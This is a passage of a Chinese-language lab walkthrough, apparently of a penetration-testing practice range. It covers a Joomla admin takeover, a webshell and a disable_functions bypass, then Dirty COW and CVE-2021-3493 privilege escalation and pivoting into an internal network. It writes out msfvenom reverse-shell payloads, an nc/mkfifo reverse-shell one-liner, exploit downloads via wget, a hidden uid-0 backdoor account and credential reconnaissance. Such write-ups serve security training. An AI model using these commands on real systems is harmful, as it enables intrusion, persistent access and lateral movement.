<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684897955634-6e00cd83-2a0c-4daf-a96b-ecbc05e1f8b3.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=188&id=ufdd785ce&originHeight=376&originWidth=2877&originalType=binary&ratio=2&rotation=0&showTitle=false&size=48086&status=done&style=none&taskId=u88983ca8-0995-4418-893d-174ee8e2cae&title=&width=1438.5" alt="image.png"><br>可以看见 administrator 成功被修改掉密码了 <br>尝试登录后台看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684898150912-6e4a22ea-c3aa-45a5-8cca-f10600cf8bd7.png#averageHue=%23fefefe&clientId=uebc9409c-fe30-4&from=paste&height=388&id=uc5acd751&originHeight=776&originWidth=2083&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63363&status=done&style=none&taskId=u6028d75c-dbfc-4c1b-9b06-9c63df0e5df&title=&width=1041.5" alt="image.png"><br><a name="vdHsa"></a></p>
<h3><span id="webshell">webshell</span></h3><p>成功登录后台 找上传 拿shell啦<br>Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files <br>可以修改和上传都可以 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684898446715-86f00614-abce-4aca-9042-5bd1ea32473d.png#averageHue=%23fdfcfc&clientId=uebc9409c-fe30-4&from=paste&height=657&id=ufe8ebb92&originHeight=1313&originWidth=2643&originalType=binary&ratio=2&rotation=0&showTitle=false&size=139622&status=done&style=none&taskId=uf9aff234-582a-4fc4-8bc0-86a92a8d31f&title=&width=1321.5" alt="image.png"><br>连接地址：<a target="_blank" rel="noopener" href="http://192.168.1.110//templates/beez3/error.php">http://192.168.1.110//templates/beez3/error.php</a><br>使用中国蚁剑 ：地址： <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684899350136-da51c387-b4fd-45bd-b0a0-72468ab313e2.png#averageHue=%23f3f3f3&clientId=uebc9409c-fe30-4&from=paste&height=403&id=ucc462da2&originHeight=806&originWidth=1360&originalType=binary&ratio=2&rotation=0&showTitle=false&size=114211&status=done&style=none&taskId=u7379238f-3955-493a-9142-fca9935d26d&title=&width=680" alt="image.png"><br>执行命令 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684899377560-7991fdfd-2586-4cb0-9f17-e857fa81a840.png#averageHue=%23111111&clientId=uebc9409c-fe30-4&from=paste&height=432&id=ue235b7a0&originHeight=864&originWidth=1378&originalType=binary&ratio=2&rotation=0&showTitle=false&size=102645&status=done&style=none&taskId=ubf1772fc-2d9b-4a23-b0c9-cbfcacc37de&title=&width=689" alt="image.png"><br>但是返回ret&#x3D;127 <br>说明是禁用了部分函数，不能执行命令导致 ，这就要突破disable_functions限制 <br><strong>原理：</strong><br>当 disable_functions 禁用了命令执行函数，webshell 无法执行系统命令时，可以通过环境变量 LD_PRELOAD 劫持系统函数，来突破 disable_functions 限制执行操作系统命令<br>这里使用蚁剑的插件 进行突破 disable_functions<br>安装这个插件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684899738396-28aacd33-9f62-4336-b201-3e9eb584387e.png#averageHue=%23f7f6f6&clientId=uebc9409c-fe30-4&from=paste&height=129&id=ude9a58be&originHeight=258&originWidth=612&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31112&status=done&style=none&taskId=uc1d65613-67f0-4bff-ade7-10a953933c7&title=&width=306" alt="image.png"><br>就选这个把  ，基本都是可以使用的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684899962326-37ff420d-6009-4534-9d95-31381c90b919.png#averageHue=%23f2f2f2&clientId=uebc9409c-fe30-4&from=paste&height=302&id=u45425309&originHeight=603&originWidth=924&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65670&status=done&style=none&taskId=ud2417ea4-f78e-4c0a-9558-e53660eb98b&title=&width=462" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684899991890-293ac267-4507-47ef-82ad-7e80af17d5bb.png#averageHue=%230d0d0d&clientId=uebc9409c-fe30-4&from=paste&height=376&id=ud2d549c5&originHeight=752&originWidth=1353&originalType=binary&ratio=2&rotation=0&showTitle=false&size=149665&status=done&style=none&taskId=u9f6bd0d1-7545-4c04-8cee-3b5a24eef06&title=&width=676.5" alt="image.png"><br>成功执行命令 <br>这样不方便，先生成了msf的linux shell  反弹到msf 方便执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=1111 -f elf  &gt; shell.elf<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684900236449-e2005ccf-3b44-44ed-8cc3-5569830ae02c.png#averageHue=%23191a1c&clientId=uebc9409c-fe30-4&from=paste&height=106&id=u8f74f7c0&originHeight=212&originWidth=1870&originalType=binary&ratio=2&rotation=0&showTitle=false&size=50384&status=done&style=none&taskId=ub364584c-08f8-4667-8bf1-fa0408665db&title=&width=935" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684912668353-7e11a049-615a-48bb-a1e9-9fbe7c0d9470.png#averageHue=%2317181b&clientId=uebc9409c-fe30-4&from=paste&height=689&id=u63b2cc6f&originHeight=1378&originWidth=1551&originalType=binary&ratio=2&rotation=0&showTitle=false&size=157701&status=done&style=none&taskId=u788877a0-8093-48e9-9a0e-020ee6ab7b9&title=&width=775.5" alt="image.png"><br>这边发现一直反弹不了 ，没仔细看IP ，发现IP是192.168.93.120 并不是 192.168.1.110 了 <br>这是咋回事呢 。。。？？<br>那就先信息搜集这台主机的信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">uname -a    <span class="hljs-comment"># 获取所有版本信息</span><br>uname -m    <span class="hljs-comment"># 获取Linux内核架构</span><br>cat /proc/version    <span class="hljs-comment"># 获取内核信息 </span><br>cat /etc/*-release   <span class="hljs-comment"># 发布信息</span><br>cat /etc/issue    <span class="hljs-comment"># 发布信息</span><br>hostname    <span class="hljs-comment"># 获取主机名</span><br>cat /etc/passwd    <span class="hljs-comment"># 列出系统所有用户 </span><br>cat /etc/group    <span class="hljs-comment"># 列出系统所有组 </span><br>w    <span class="hljs-comment"># 查看目前登录的用户</span><br>whoami    <span class="hljs-comment"># 查看当前用户 </span><br><span class="hljs-built_in">id</span>    <span class="hljs-comment"># 查看当前用户信息 </span><br>sudo -l    <span class="hljs-comment"># 列出目前用户可执行与无法执行的指令 </span><br>ps aux    <span class="hljs-comment"># 查看进程信息 </span><br>ls -la /etc/cron*    <span class="hljs-comment"># 查看计划任务</span><br>ifconfig -a    <span class="hljs-comment"># 列出网络接口信息 </span><br>cat /etc/network/interfaces    <span class="hljs-comment"># 列出网络接口信息 </span><br>arp -a    <span class="hljs-comment"># 查看系统arp表 </span><br>route    <span class="hljs-comment"># 打印路由信息</span><br>netstat -anplt    <span class="hljs-comment"># 打印本地端口开放信息 </span><br>iptables -L    <span class="hljs-comment"># 列出iptable的配置规则</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684913025182-1a72915f-63a9-4728-a54c-441c65f7cb32.png#averageHue=%23080606&clientId=uebc9409c-fe30-4&from=paste&height=487&id=u81bdf35d&originHeight=974&originWidth=1554&originalType=binary&ratio=2&rotation=0&showTitle=false&size=261570&status=done&style=none&taskId=u07a213df-4983-4ea4-905b-8af9ea837b0&title=&width=777" alt="image.png"><br>可以看出 是ubuntu 64 位系统 ，<br>192.168.93.120 与 192.168.93.100 存在这连接的<br>看了下内核 是4.4.0-142 我尝试了 其中kali中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">linux/local/44298.c<br></code></pre></td></tr></table></figure>
<p> 比较相近的poc 但是无果 <br>查找到一个CVE-2019-18683 可能存在 提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684913910339-49f0c1cb-9f8e-454d-bfba-32fec24783d5.png#averageHue=%23ebedf0&clientId=uebc9409c-fe30-4&from=paste&height=255&id=MYP4q&originHeight=510&originWidth=2368&originalType=binary&ratio=2&rotation=0&showTitle=false&size=119710&status=done&style=none&taskId=uc506c6cd-9751-4dd3-b33b-cdb28888a02&title=&width=1184" alt="image.png"><br>但是好像比较麻烦。。。先放一边<br>在tmp目录存在三个 文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684914078764-2a19daa7-c822-48d8-9891-90fca4883490.png#averageHue=%23080707&clientId=uebc9409c-fe30-4&from=paste&height=40&id=uc23df935&originHeight=80&originWidth=712&originalType=binary&ratio=2&rotation=0&showTitle=false&size=11344&status=done&style=none&taskId=ub8f2b42e-72ae-482c-99dc-9bc57be1cca&title=&width=356" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684914064533-75b93714-72e0-4961-9cc2-04503961e49e.png#averageHue=%23201f1f&clientId=uebc9409c-fe30-4&from=paste&height=86&id=ua63f2d41&originHeight=171&originWidth=1349&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28219&status=done&style=none&taskId=u6c015777-de60-407d-9228-d03190275c9&title=&width=674.5" alt="image.png"><br><a name="NSKpj"></a></p>
<h2><span id="ssh">SSH</span></h2><p>进入mysql  ,mysql中存在 一个test.txt 文件 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">adduser wwwuser<br>passwd wwwuser_123Aqx<br></code></pre></td></tr></table></figure>
<p>是一个用户密码<br>mysql的数据库密码 ？？？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684914297258-8bb4a929-6c3f-467e-b231-9ff6aa28ae08.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=73&id=uf881177d&originHeight=146&originWidth=1659&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28851&status=done&style=none&taskId=ub1c42b64-e16f-4b55-9c21-68a0d53d8ab&title=&width=829.5" alt="image.png"><br>显然不是啊 <br>192.168.1.110 开放了22 端口 ，是否是他的密码呢 <br>使用ssh 连接 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684914895285-469ed78c-352d-4520-a032-a6d2b01badfc.png#averageHue=%2317181b&clientId=uebc9409c-fe30-4&from=paste&height=262&id=u9d12f77f&originHeight=523&originWidth=2380&originalType=binary&ratio=2&rotation=0&showTitle=false&size=108001&status=done&style=none&taskId=ubde6062c-f260-475f-ab2f-a7d03ac1bcb&title=&width=1190" alt="image.png"><br>报错 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Unable to negotiate <span class="hljs-keyword">with</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span> port <span class="hljs-number">22</span>: no matching host key <span class="hljs-built_in">type</span> found. Their offer: ssh-rsa,ssh-dss<br></code></pre></td></tr></table></figure>
<p>由提示得知，ssh不能远程登录的原因为：没有找到相关的主机密钥类型。<br>1、确实是主机密钥类型不符合<br>2、不存在相关主机密钥类型<br>解决办法： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">方法<span class="hljs-number">1</span>、命令中加参数<br>ssh -o HostKeyAlgorithms=+ssh-dss  wwwueser@<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.110</span> <br><br>方法<span class="hljs-number">2</span>、在~/.ssh目录下添加config<br>vi config<br>在config中写入以下code：<br>Host *<br>HostKeyAlgorithms +ssh-dss<br>重启ssh<br>service ssh restart<br></code></pre></td></tr></table></figure>
<p>使用方法一 成功连接 ssh  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684915146504-faed279b-1da7-427f-bc36-2a1a7bb90801.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=439&id=ue832682d&originHeight=877&originWidth=2172&originalType=binary&ratio=2&rotation=0&showTitle=false&size=192129&status=done&style=none&taskId=u2c616011-3bdb-4411-b5b2-4e8ae51d56a&title=&width=1086" alt="image.png"><br>这才是对的 ，<br>到这里已经获取到两台主机的权限了 ，但是偏低<br>ubuntu 提权比较麻烦，查看 Centos 是否好提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684915287133-6d9a44e7-009d-4212-9eaa-b438b4ccd56d.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=70&id=u4595df42&originHeight=139&originWidth=1970&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28079&status=done&style=none&taskId=u47c46ee8-f2d3-4131-90b4-76251dde0b8&title=&width=985" alt="image.png"><br>2.6.32 提权希望很大啊 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684915371949-7580e50c-37ce-4888-984c-f384c0f9a10f.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=236&id=u7da6eb86&originHeight=472&originWidth=2860&originalType=binary&ratio=2&rotation=0&showTitle=false&size=139548&status=done&style=none&taskId=u0fb98db9-620d-46c8-9270-818c9811670&title=&width=1430" alt="image.png"><br>感觉这个25444.c 比较合适啊<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684916604569-5d1bbe22-4b56-4952-acb5-b94f7bd3e0fe.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=145&id=u03008cb1&originHeight=290&originWidth=1492&originalType=binary&ratio=2&rotation=0&showTitle=false&size=53826&status=done&style=none&taskId=u9289437c-d7a9-4c2e-8fde-c400a829ae5&title=&width=746" alt="image.png"><br>失败 <br><strong>mempodipper.c  失败</strong><br><a target="_blank" rel="noopener" href="http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c">http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c</a><br>使用wget 获取 wget  <a target="_blank" rel="noopener" href="http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c">http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684916663950-e1b96987-bc22-4134-801d-e7a60cc22695.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=302&id=ue682f82f&originHeight=603&originWidth=1236&originalType=binary&ratio=2&rotation=0&showTitle=false&size=62129&status=done&style=none&taskId=u2dd73db9-738b-4650-8aa6-15ca35fe693&title=&width=618" alt="image.png"><br><a name="bBLW0"></a></p>
<h2><span id="centos-脏牛cve-2016-5195提权">Centos 脏牛（CVE-2016-5195）提权</span></h2><p><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917204254-469a4bd7-b695-4062-842d-191e023ce82e.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=245&id=ub1329000&originHeight=490&originWidth=2151&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85839&status=done&style=none&taskId=u594a5d08-490d-41d6-91cd-ceae3d65dd6&title=&width=1075.5" alt="image.png"><br>编译下载的EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gcc -pthread dirty.c -o dirty -lcrypt<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917260964-7c2a0d90-4b6c-4bc9-8f7e-8adc1a4dbf53.png#averageHue=%23191a1c&clientId=uebc9409c-fe30-4&from=paste&height=57&id=u9a3de286&originHeight=113&originWidth=866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=18454&status=done&style=none&taskId=uf2d2f3cd-09d6-4dd1-a229-149ff25e9ca&title=&width=433" alt="image.png"><br>执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./dirty <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917401718-2ecde537-6ad8-4bce-a9a0-1a6599550d6b.png#averageHue=%23141920&clientId=uebc9409c-fe30-4&from=paste&height=403&id=u40caadc8&originHeight=806&originWidth=1578&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75657&status=done&style=none&taskId=u11e270cc-e557-463a-9115-1fc7a7c5ac6&title=&width=789" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917347216-cec0acbc-70bb-4f9e-8b89-bcf8f9d64562.png#averageHue=%23191a1c&clientId=uebc9409c-fe30-4&from=paste&height=124&id=u4c2d55ab&originHeight=248&originWidth=999&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36849&status=done&style=none&taskId=u2cb4a1e7-eac1-4268-9ed9-157144219c5&title=&width=499.5" alt="image.png"><br>运行之后要恢复 passwd<br>先切换用户 firefart<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917447936-07914afd-ee28-48b5-9487-f5067888ee0e.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=143&id=u53321f33&originHeight=285&originWidth=1777&originalType=binary&ratio=2&rotation=0&showTitle=false&size=54744&status=done&style=none&taskId=ua7f90001-bc42-4c07-9192-bdf924374d6&title=&width=888.5" alt="image.png"><br>Centos成功提权<br><a name="rxbL1"></a></p>
<h3><span id="权限维持">权限维持</span></h3><p>创建一个test的 root 用户 密码为 123456</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">useradd -p <span class="hljs-string">&#x27;openssl passwd -1 -salt &#x27;</span>salt<span class="hljs-string">&#x27; 123456&#x27;</span> test -o -u <span class="hljs-number">0</span> -g root -G root -s /<span class="hljs-built_in">bin</span>/bash -d /home/mysqld<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684917821579-b230fd04-013f-49b4-9c43-1f71b6969cfc.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=520&id=u6183fdeb&originHeight=1040&originWidth=2199&originalType=binary&ratio=2&rotation=0&showTitle=false&size=211483&status=done&style=none&taskId=u1f6f2cce-bbf9-4d7f-963a-f6b6a62e503&title=&width=1099.5" alt="image.png"><br><a name="dOwfQ"></a></p>
<h2><span id="ubuntu-cve-2021-3493-提权">Ubuntu  CVE-2021-3493  提权</span></h2><p>因为Centos 没有 nc 要先下载nc <br>安装包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">64</span>位 ：<br>http://vault.centos.org/<span class="hljs-number">6.6</span>/os/x86_64/Packages/nc-<span class="hljs-number">1.84</span>-<span class="hljs-number">22.</span>el6.x86_64.rpm<br><br><span class="hljs-number">32</span>位：<br>http://vault.centos.org/<span class="hljs-number">6.6</span>/os/i386/Packages/nc-<span class="hljs-number">1.84</span>-<span class="hljs-number">22.</span>el6.i686.rpm<br></code></pre></td></tr></table></figure>
<p>上传到Centos 上<br>安装 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">rpm -iUv nc-<span class="hljs-number">1.84</span>-<span class="hljs-number">22.</span>el6.x86_64.rpm<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684918416918-4927ea0c-4a47-47ba-bf2a-515b7265b811.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=370&id=u9abb5ccd&originHeight=740&originWidth=2805&originalType=binary&ratio=2&rotation=0&showTitle=false&size=151908&status=done&style=none&taskId=uf9b57904-79a4-49e1-982b-4c6f0beef9d&title=&width=1402.5" alt="image.png"><br>把shell 反弹到 Centos <br>Centos 监听 ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc -l <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>

<p>Ubuntu :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/<span class="hljs-built_in">bin</span>/sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span><span class="hljs-number">.93</span><span class="hljs-number">.100</span> <span class="hljs-number">2222</span>&gt;/tmp/f<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684918969963-b7a02dce-e885-44e4-85e8-19d8b92091f9.png#averageHue=%23272525&clientId=uebc9409c-fe30-4&from=paste&height=62&id=u3ae36c70&originHeight=124&originWidth=955&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20536&status=done&style=none&taskId=u46fe4f30-6ce4-4033-a837-6284b77665d&title=&width=477.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684918984429-b81c1564-8242-43b9-a081-6cc06f17cdfd.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=160&id=u9426b1ad&originHeight=319&originWidth=1534&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36399&status=done&style=none&taskId=u8d722d8d-3113-410c-83f2-e124d286e85&title=&width=767" alt="image.png"><br>成功反弹shell <br>把POC 上传上去<br>POC:  <a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684919136931-e3a185ed-fdb6-4a52-be02-025267f50383.png#averageHue=%23161719&clientId=uebc9409c-fe30-4&from=paste&height=205&id=ua2257e26&originHeight=409&originWidth=1637&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36693&status=done&style=none&taskId=u271c7ef8-f102-420f-8aff-497fe048efa&title=&width=818.5" alt="image.png"><br><strong>Ubuntu特权提升漏洞（CVE-2021-3493）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">漏洞描述<br>OverlayFS漏洞允许Ubuntu下的本地用户获得root权限。<br>Linux内核中overlayfs文件系统中的Ubuntu特定问题，<br>在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。<br>由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。<br><br><br>影响版本<br>Ubuntu <span class="hljs-number">20.10</span><br>Ubuntu <span class="hljs-number">20.04</span> LTS<br>Ubuntu <span class="hljs-number">18.04</span> LTS<br>Ubuntu <span class="hljs-number">16.04</span> LTS<br>Ubuntu <span class="hljs-number">14.04</span> ESM<br></code></pre></td></tr></table></figure>
<p>编译提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc  -o exp exploit.c<br><span class="hljs-built_in">chmod</span> +x exp<br>./exp<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684937631773-cbc01bc8-53d6-4a4b-99d8-10724d11ec6b.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=394&id=ub0868a56&originHeight=788&originWidth=1997&originalType=binary&ratio=2&rotation=0&showTitle=false&size=90050&status=done&style=none&taskId=u9b38ddb2-051f-45a1-9da5-7c49eab5cc2&title=&width=998.5" alt="image.png"><br>成功提权</p>
<p><a name="AoNhV"></a></p>
<h1><span id="进入内网">进入内网</span></h1><p><a name="aZzgt"></a></p>
<h2><span id="centos-上线msf">Centos 上线MSF</span></h2><p>使用msfvenom 生成 shell ，反弹到msf 上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.10 lport=1111 -f elf &gt; a.elf<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684974655456-92348394-7c1a-4fa9-9734-c9e3e6c12055.png#averageHue=%23181a1c&clientId=uebc9409c-fe30-4&from=paste&height=134&id=u5f126ada&originHeight=268&originWidth=1700&originalType=binary&ratio=2&rotation=0&showTitle=false&size=56463&status=done&style=none&taskId=udf37bc46-00c8-4ec3-93d5-0a382f74c13&title=&width=850" alt="image.png"><br>上传到Centos 运行 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684974767700-c1600154-b0f8-43d8-a740-e118183088a1.png#averageHue=%2316181a&clientId=uebc9409c-fe30-4&from=paste&height=332&id=ua6f9fc3a&originHeight=663&originWidth=2769&originalType=binary&ratio=2&rotation=0&showTitle=false&size=110354&status=done&style=none&taskId=udd763335-d019-4ed5-baa5-f8d363cbc88&title=&width=1384.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684974786270-8c58d03a-5beb-4556-b585-7f44cedb3f6d.png#averageHue=%2317181a&clientId=uebc9409c-fe30-4&from=paste&height=273&id=u08367b52&originHeight=545&originWidth=2113&originalType=binary&ratio=2&rotation=0&showTitle=false&size=110501&status=done&style=none&taskId=ub851e137-934e-47f1-9664-7f93a2d82a2&title=&width=1056.5" alt="image.png"><br>获取到shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684975054586-cdb386f4-c4d2-4dba-a602-db39a6564e2f.png#averageHue=%2318191b&clientId=uebc9409c-fe30-4&from=paste&height=499&id=uf3f289e7&originHeight=997&originWidth=1823&originalType=binary&ratio=2&rotation=0&showTitle=false&size=197450&status=done&style=none&taskId=u05b9e775-44c0-4286-9b89-8d2e3e6abd3&title=&width=911.5" alt="image.png"><br>内网IP段 192.168.93.0 段 <br>搭建路由<br><a name="bSmKD"></a></p>
<h2><span id="搭建msf路由与代理">搭建MSF路由与代理</span></h2><p>MSF路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run autoroute -s 192.168.93.0/24<br></code></pre></td></tr></table></figure>
<p>或者使用 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/multi/script/web_delivery<br>route add 192.168.93.0 255.255.255.0 1 <br>route print<br></code></pre></td></tr></table></figure>
<p>添加MSF路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684975301027-c4107e70-c19a-4a11-b826-aea0f5b08dcc.png#averageHue=%23191a1c&clientId=uebc9409c-fe30-4&from=paste&height=149&id=u76043a7e&originHeight=298&originWidth=1349&originalType=binary&ratio=2&rotation=0&showTitle=false&size=50438&status=done&style=none&taskId=ud27d452a-dc2a-4336-a3d1-a9d09c756db&title=&width=674.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684975686912-9f49b301-ed0f-4415-96fc-fdba0ab399f4.png#averageHue=%2317181a&clientId=ua52ffc9a-d2fd-4&from=paste&height=214&id=u225ba721&originHeight=427&originWidth=1600&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42835&status=done&style=none&taskId=ud5c97088-bedb-46ed-826d-b29659fe592&title=&width=800" alt="image.png"><br>使用Vemom 搭建代理<br>Centos 客户端启动<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684976850249-99f6ad4f-02c9-410a-8558-f5bd98aabd28.png#averageHue=%2318191b&clientId=ua52ffc9a-d2fd-4&from=paste&height=76&id=u982ec09f&originHeight=151&originWidth=1516&originalType=binary&ratio=2&rotation=0&showTitle=false&size=22814&status=done&style=none&taskId=u688f2f3d-32a1-4628-a562-a30861fdc35&title=&width=758" alt="image.png"><br>服务器收到 <br><img 